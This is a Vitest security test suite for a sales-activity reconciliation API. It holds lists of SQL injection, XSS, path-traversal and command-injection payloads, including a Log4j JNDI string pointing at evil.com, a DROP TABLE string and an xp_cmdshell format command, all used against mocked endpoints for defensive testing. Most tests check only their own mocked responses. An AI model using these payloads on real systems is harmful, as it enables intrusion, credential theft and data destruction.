/**
 * Security Testing - Sales Activities and Pipeline Deals Reconciliation
 * 
 * Tests user isolation (owner_id constraints), input sanitization, SQL injection prevention,
 * and audit trail security to ensure system security and data protection.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { supabase } from '@/lib/supabase/clientV2';

// Mock supabase
vi.mock('@/lib/supabase/clientV2', () => ({
  supabase: {
    auth: {
      getUser: vi.fn()
    },
    from: vi.fn(() => ({
      select: vi.fn().mockReturnThis(),
      insert: vi.fn().mockReturnThis(),
      update: vi.fn().mockReturnThis(),
      delete: vi.fn().mockReturnThis(),
      eq: vi.fn().mockReturnThis(),
      in: vi.fn().mockReturnThis(),
      gte: vi.fn().mockReturnThis(),
      lte: vi.fn().mockReturnThis(),
      order: vi.fn().mockReturnThis(),
      limit: vi.fn().mockReturnThis(),
      single: vi.fn()
    }))
  }
}));

// Mock fetch globally
global.fetch = vi.fn();

// Security test utilities
class SecurityTestUtils {
  // Common SQL injection payloads
  static sqlInjectionPayloads = [
    "'; DROP TABLE sales_activities; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; UPDATE deals SET owner_id = 'attacker' --",
    "' OR 1=1 --",
    "admin'--",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('format c:') --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "1' ORDER BY 1--+"
  ];

  // XSS payloads
  static xssPayloads = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "' onmouseover='alert(1)' bad='",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<<SCRIPT>alert(\"XSS\")<</SCRIPT>"
  ];

  // Invalid data inputs
  static invalidInputs = [
    null,
    undefined,
    "",
    "   ",
    "\n\t\r",
    "very".repeat(1000), // Extremely long string
    String.fromCharCode(0), // Null byte
    "../../etc/passwd", // Path traversal
    "${jndi:ldap://evil.com/a}", // Log4j injection
    "{{7*7}}", // Template injection
    "$(echo vulnerable)", // Command injection
    Array(10000).fill("A").join("") // Buffer overflow attempt
  ];

  static createMaliciousUser(id: string = 'malicious-user') {
    return {
      id,
      email: `${id}@evil.com`,
      user_metadata: {
        name: "<script>alert('XSS')</script>",
        role: "admin'; DROP TABLE users; --"
      }
    };
  }

  static createAuthenticatedUser(id: string = 'auth-user') {
    return {
      id,
      email: `${id}@example.com`,
      user_metadata: {
        name: 'Legitimate User',
        role: 'user'
      }
    };
  }

  static mockDatabaseResponse(data: any, error: any = null) {
    return {
      data,
      error,
      status: error ? 400 : 200,
      statusText: error ? 'Bad Request' : 'OK'
    };
  }

  static async simulateApiCall(endpoint: string, payload: any, user: any) {
    // Mock authentication
    vi.spyOn(supabase.auth, 'getUser').mockResolvedValue({
      data: { user },
      error: null
    });

    const response = await fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    return response;
  }

  static generateAuditLogEntry(action: string, userId: string, details: any = {}) {
    return {
      id: Math.floor(Math.random() * 10000),
      user_id: userId,
      action,
      table_name: 'sales_activities',
      record_id: `record-${Math.floor(Math.random() * 1000)}`,
      old_values: details.oldValues || {},
      new_values: details.newValues || {},
      timestamp: new Date().toISOString(),
      ip_address: '192.168.1.1',
      user_agent: 'Mozilla/5.0 (Test Browser)',
      metadata: details.metadata || {}
    };
  }
}

describe('Security Testing', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('User Isolation and Owner ID Constraints', () => {
    it('should enforce owner_id constraints on data access', async () => {
      const user1 = SecurityTestUtils.createAuthenticatedUser('user-1');
      const user2 = SecurityTestUtils.createAuthenticatedUser('user-2');

      // User 1's data
      const user1Activities = [
        { id: 'act-1', owner_id: 'user-1', client_name: 'User 1 Client', amount: 1000 },
        { id: 'act-2', owner_id: 'user-1', client_name: 'User 1 Client 2', amount: 2000 }
      ];

      // User 2's data
      const user2Activities = [
        { id: 'act-3', owner_id: 'user-2', client_name: 'User 2 Client', amount: 3000 }
      ];

      // Mock database to return only user's own data
      (supabase.from as any)().single.mockImplementation(() => {
        // Simulate owner_id constraint in database
        const currentUser = user1; // Simulating user 1 is making the request
        return SecurityTestUtils.mockDatabaseResponse(
          user1Activities.filter(act => act.owner_id === currentUser.id)
        );
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'orphan', userId: 'user-1' },
        user1
      );

      // Verify user can only access their own data
      expect(response).toBeDefined();
      // In a real scenario, the database would enforce this constraint
    });

    it('should prevent cross-user data access attempts', async () => {
      const maliciousUser = SecurityTestUtils.createMaliciousUser();
      const targetUserId = 'target-user';

      // Attempt to access another user's data
      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ error: 'Access denied: Invalid user ID' })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { 
          analysisType: 'orphan',
          userId: targetUserId // Trying to access different user's data
        },
        maliciousUser
      );

      expect(response.ok).toBe(false);
      expect(response.status).toBe(403);
    });

    it('should validate user ownership in reconciliation operations', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();
      
      // Mock response for unauthorized operation
      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ 
          error: 'Forbidden: Cannot modify records not owned by user'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/actions',
        {
          action: 'link_manual',
          activityId: 'act-belongs-to-other-user',
          dealId: 'deal-belongs-to-other-user'
        },
        user
      );

      expect(response.status).toBe(403);
      const result = await response.json();
      expect(result.error).toContain('Cannot modify records not owned by user');
    });

    it('should ensure audit logs are user-specific', async () => {
      const user1 = SecurityTestUtils.createAuthenticatedUser('user-1');
      const user2 = SecurityTestUtils.createAuthenticatedUser('user-2');

      const user1AuditLogs = [
        SecurityTestUtils.generateAuditLogEntry('MANUAL_LINK', 'user-1'),
        SecurityTestUtils.generateAuditLogEntry('CREATE_DEAL', 'user-1')
      ];

      const user2AuditLogs = [
        SecurityTestUtils.generateAuditLogEntry('MANUAL_LINK', 'user-2')
      ];

      // Mock supabase to enforce user isolation in audit logs
      (supabase.from as any)().single.mockImplementation(() => {
        const currentUser = user1;
        const userLogs = user1AuditLogs.filter(log => log.user_id === currentUser.id);
        return SecurityTestUtils.mockDatabaseResponse(userLogs);
      });

      // User 1 should only see their own audit logs
      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/audit',
        { userId: 'user-1' },
        user1
      );

      expect(response).toBeDefined();
      // Database constraints should ensure only user's own logs are returned
    });

    it('should prevent privilege escalation attempts', async () => {
      const regularUser = SecurityTestUtils.createAuthenticatedUser();

      // Attempt to perform admin-level operation
      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ 
          error: 'Insufficient privileges for requested operation'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/admin/purge',
        { userId: regularUser.id },
        regularUser
      );

      expect(response.status).toBe(403);
    });
  });

  describe('Input Sanitization and Validation', () => {
    it('should sanitize malicious input in analysis requests', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      for (const maliciousInput of SecurityTestUtils.xssPayloads) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid input: malicious content detected'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/analysis',
          {
            analysisType: 'orphan',
            clientName: maliciousInput, // XSS attempt
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
        const result = await response.json();
        expect(result.error).toContain('Invalid input');
      }
    });

    it('should validate input length and format', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      for (const invalidInput of SecurityTestUtils.invalidInputs) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Input validation failed'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/analysis',
          {
            analysisType: 'orphan',
            startDate: invalidInput, // Invalid date input
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
      }
    });

    it('should reject requests with missing required fields', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 400,
        json: () => Promise.resolve({ 
          error: 'Missing required field: analysisType'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        {
          // Missing analysisType
          userId: user.id
        },
        user
      );

      expect(response.status).toBe(400);
      const result = await response.json();
      expect(result.error).toContain('Missing required field');
    });

    it('should validate numeric inputs', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      const invalidNumericInputs = [
        'not-a-number',
        '123abc',
        'Infinity',
        'NaN',
        '1e10000', // Very large number
        '-1e10000', // Very small number
        '123.456.789', // Invalid decimal format
      ];

      for (const invalidNumber of invalidNumericInputs) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid numeric input'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/analysis',
          {
            analysisType: 'matching',
            confidenceThreshold: invalidNumber,
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
      }
    });

    it('should sanitize file path inputs', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' // URL encoded
      ];

      for (const maliciousPath of pathTraversalAttempts) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid file path detected'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/export',
          {
            format: 'csv',
            outputPath: maliciousPath,
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
      }
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in analysis queries', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      for (const sqlPayload of SecurityTestUtils.sqlInjectionPayloads) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'SQL injection attempt detected'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/analysis',
          {
            analysisType: 'orphan',
            clientName: sqlPayload, // SQL injection attempt
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
        const result = await response.json();
        expect(result.error).toContain('SQL injection attempt detected');
      }
    });

    it('should use parameterized queries for user input', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock successful response (indicating parameterized queries worked)
      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ 
          data: {
            orphan_activities: [],
            orphan_deals: [],
            summary: { total_orphan_activities: 0 }
          }
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        {
          analysisType: 'orphan',
          clientName: "O'Reilly Media", // Legitimate single quote that could break unparameterized queries
          userId: user.id
        },
        user
      );

      expect(response.ok).toBe(true);
      // If using parameterized queries, single quotes shouldn't cause issues
    });

    it('should prevent SQL injection in reconciliation execution', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      for (const sqlPayload of SecurityTestUtils.sqlInjectionPayloads) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid input format detected'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/execute',
          {
            mode: 'safe',
            filters: {
              activityIds: [sqlPayload], // SQL injection in array parameter
            },
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
      }
    });

    it('should prevent SQL injection in manual actions', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      for (const sqlPayload of SecurityTestUtils.sqlInjectionPayloads) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Malicious input detected in ID field'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/actions',
          {
            action: 'link_manual',
            activityId: sqlPayload, // SQL injection in ID field
            dealId: 'deal-123',
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
      }
    });

    it('should validate UUID format for ID fields', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      const invalidUUIDs = [
        'not-a-uuid',
        '123',
        'abc-def-ghi',
        '00000000-0000-0000-0000-000000000000z', // Too long
        '00000000-0000-0000-0000', // Too short
        '\'; DROP TABLE activities; --'
      ];

      for (const invalidUUID of invalidUUIDs) {
        (global.fetch as any).mockResolvedValue({
          ok: false,
          status: 400,
          json: () => Promise.resolve({ 
            error: 'Invalid UUID format'
          })
        });

        const response = await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/actions',
          {
            action: 'link_manual',
            activityId: invalidUUID,
            dealId: 'valid-uuid-here',
            userId: user.id
          },
          user
        );

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Audit Trail Security', () => {
    it('should log all reconciliation actions securely', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock successful action with audit logging
      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ 
          success: true,
          auditLogId: 12345,
          action: 'link_manual'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/actions',
        {
          action: 'link_manual',
          activityId: 'act-123',
          dealId: 'deal-456',
          userId: user.id
        },
        user
      );

      expect(response.ok).toBe(true);
      const result = await response.json();
      expect(result.auditLogId).toBeDefined();
      // Audit log should be created for every action
    });

    it('should prevent audit log tampering', async () => {
      const maliciousUser = SecurityTestUtils.createMaliciousUser();

      // Attempt to modify audit logs
      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 403,
        json: () => Promise.resolve({ 
          error: 'Audit logs are immutable'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/audit/modify',
        {
          auditLogId: 123,
          newValues: { action: 'HARMLESS_ACTION' },
          userId: maliciousUser.id
        },
        maliciousUser
      );

      expect(response.status).toBe(403);
      const result = await response.json();
      expect(result.error).toContain('immutable');
    });

    it('should store sensitive information securely in audit logs', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      const auditLog = SecurityTestUtils.generateAuditLogEntry('MANUAL_LINK', user.id, {
        oldValues: { deal_id: null },
        newValues: { deal_id: 'deal-123' },
        metadata: {
          ip_address: '192.168.1.1',
          user_agent: 'Mozilla/5.0 (Test)',
          confidence_score: 85
        }
      });

      // Verify sensitive data is properly handled
      expect(auditLog.user_id).toBe(user.id);
      expect(auditLog.ip_address).toBeDefined();
      expect(auditLog.user_agent).toBeDefined();
      
      // Sensitive fields should not contain user input directly
      expect(auditLog.old_values).not.toContain('<script>');
      expect(auditLog.new_values).not.toContain('DROP TABLE');
    });

    it('should maintain audit trail integrity', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock response with checksum or hash for integrity
      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ 
          auditLogs: [
            {
              ...SecurityTestUtils.generateAuditLogEntry('MANUAL_LINK', user.id),
              integrity_hash: 'sha256:abc123def456' // Simulated integrity hash
            }
          ],
          totalCount: 1
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/audit',
        { userId: user.id },
        user
      );

      expect(response.ok).toBe(true);
      const result = await response.json();
      expect(result.auditLogs[0].integrity_hash).toBeDefined();
      // Each audit log should have an integrity hash
    });

    it('should log failed security attempts', async () => {
      const maliciousUser = SecurityTestUtils.createMaliciousUser();

      // Mock security violation logging
      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 400,
        json: () => Promise.resolve({ 
          error: 'Security violation logged',
          incidentId: 'SEC-2024-001'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        {
          analysisType: 'orphan',
          clientName: "'; DROP TABLE sales_activities; --",
          userId: maliciousUser.id
        },
        maliciousUser
      );

      expect(response.status).toBe(400);
      const result = await response.json();
      expect(result.incidentId).toBeDefined();
      // Security violations should be logged with incident IDs
    });
  });

  describe('Authentication and Authorization Security', () => {
    it('should reject requests without authentication', async () => {
      // Mock unauthenticated user
      vi.spyOn(supabase.auth, 'getUser').mockResolvedValue({
        data: { user: null },
        error: { message: 'Not authenticated' }
      });

      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ 
          error: 'Authentication required'
        })
      });

      const response = await fetch('/api/reconcile/analysis', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ analysisType: 'orphan' })
      });

      expect(response.status).toBe(401);
    });

    it('should validate JWT token integrity', async () => {
      // Mock invalid/tampered token
      vi.spyOn(supabase.auth, 'getUser').mockRejectedValue(
        new Error('Invalid JWT signature')
      );

      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ 
          error: 'Invalid authentication token'
        })
      });

      const response = await fetch('/api/reconcile/analysis', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': 'Bearer invalid.jwt.token'
        },
        body: JSON.stringify({ analysisType: 'orphan' })
      });

      expect(response.status).toBe(401);
    });

    it('should enforce rate limiting', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock rate limit exceeded
      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 429,
        json: () => Promise.resolve({ 
          error: 'Rate limit exceeded',
          retryAfter: 60
        })
      });

      // Simulate rapid requests
      const requests = Array(100).fill(null).map(() =>
        SecurityTestUtils.simulateApiCall(
          '/api/reconcile/analysis',
          { analysisType: 'orphan', userId: user.id },
          user
        )
      );

      const responses = await Promise.all(requests);
      
      // At least some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should handle session timeout security', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock expired session
      vi.spyOn(supabase.auth, 'getUser').mockResolvedValue({
        data: { user: null },
        error: { message: 'Session expired' }
      });

      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 401,
        json: () => Promise.resolve({ 
          error: 'Session expired. Please login again.'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'orphan', userId: user.id },
        user
      );

      expect(response.status).toBe(401);
      const result = await response.json();
      expect(result.error).toContain('Session expired');
    });
  });

  describe('Data Leakage Prevention', () => {
    it('should not expose sensitive data in error messages', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      (global.fetch as any).mockResolvedValue({
        ok: false,
        status: 500,
        json: () => Promise.resolve({ 
          error: 'Internal server error',
          // Should NOT contain: database connection strings, file paths, stack traces
          requestId: 'req-12345'
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'invalid-type', userId: user.id },
        user
      );

      expect(response.status).toBe(500);
      const result = await response.json();
      
      // Error should be generic, not expose internal details
      expect(result.error).toBe('Internal server error');
      expect(result.error).not.toContain('password');
      expect(result.error).not.toContain('/var/www');
      expect(result.error).not.toContain('stack trace');
    });

    it('should not leak user data across requests', async () => {
      const user1 = SecurityTestUtils.createAuthenticatedUser('user-1');
      const user2 = SecurityTestUtils.createAuthenticatedUser('user-2');

      // Mock responses for different users
      (global.fetch as any)
        .mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: () => Promise.resolve({ 
            data: { user_id: 'user-1', activities: ['act-1', 'act-2'] }
          })
        })
        .mockResolvedValueOnce({
          ok: true,
          status: 200,
          json: () => Promise.resolve({ 
            data: { user_id: 'user-2', activities: ['act-3'] }
          })
        });

      const response1 = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'orphan', userId: 'user-1' },
        user1
      );

      const response2 = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'orphan', userId: 'user-2' },
        user2
      );

      const result1 = await response1.json();
      const result2 = await response2.json();

      // Each user should only see their own data
      expect(result1.data.user_id).toBe('user-1');
      expect(result2.data.user_id).toBe('user-2');
      expect(result1.data.activities).not.toContain('act-3');
      expect(result2.data.activities).not.toContain('act-1');
    });

    it('should sanitize data in logging', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock a request with sensitive data
      const sensitiveData = {
        analysisType: 'orphan',
        clientName: 'Secret Client',
        apiKey: 'secret-key-12345', // This should not be logged
        password: 'user-password', // This should not be logged
        userId: user.id
      };

      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ 
          data: { message: 'Request processed' }
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        sensitiveData,
        user
      );

      expect(response.ok).toBe(true);
      
      // In real implementation, verify that sensitive fields are not logged
      // This would require checking actual log outputs or mock log implementations
    });
  });

  describe('Security Headers and CORS', () => {
    it('should include security headers in responses', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        headers: new Map([
          ['X-Content-Type-Options', 'nosniff'],
          ['X-Frame-Options', 'DENY'],
          ['X-XSS-Protection', '1; mode=block'],
          ['Strict-Transport-Security', 'max-age=31536000; includeSubDomains'],
          ['Content-Security-Policy', "default-src 'self'"],
          ['Referrer-Policy', 'strict-origin-when-cross-origin']
        ]),
        json: () => Promise.resolve({ data: { success: true } })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'orphan', userId: user.id },
        user
      );

      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(response.headers.get('X-Frame-Options')).toBe('DENY');
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block');
    });

    it('should enforce CORS policies', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock CORS rejection
      (global.fetch as any).mockRejectedValue(
        new Error('CORS policy: Cross origin requests are not allowed')
      );

      try {
        await SecurityTestUtils.simulateApiCall(
          '/api/reconcile/analysis',
          { analysisType: 'orphan', userId: user.id },
          user
        );
      } catch (error) {
        expect(error.message).toContain('CORS policy');
      }
    });
  });

  describe('Input Encoding and Output Encoding', () => {
    it('should properly encode output to prevent XSS', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      // Mock response with potentially dangerous content
      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ 
          data: {
            activities: [
              {
                id: 'act-1',
                client_name: '&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;', // Properly encoded
                amount: 1000
              }
            ]
          }
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        { analysisType: 'orphan', userId: user.id },
        user
      );

      const result = await response.json();
      
      // Output should be properly encoded
      expect(result.data.activities[0].client_name).toContain('&lt;script&gt;');
      expect(result.data.activities[0].client_name).not.toContain('<script>');
    });

    it('should handle unicode and special characters safely', async () => {
      const user = SecurityTestUtils.createAuthenticatedUser();

      const unicodeTestData = {
        analysisType: 'orphan',
        clientName: '测试客户端 🏢 café naïve résumé', // Unicode characters
        userId: user.id
      };

      (global.fetch as any).mockResolvedValue({
        ok: true,
        status: 200,
        json: () => Promise.resolve({ 
          data: { message: 'Unicode handled correctly' }
        })
      });

      const response = await SecurityTestUtils.simulateApiCall(
        '/api/reconcile/analysis',
        unicodeTestData,
        user
      );

      expect(response.ok).toBe(true);
      // System should handle unicode without security issues
    });
  });
});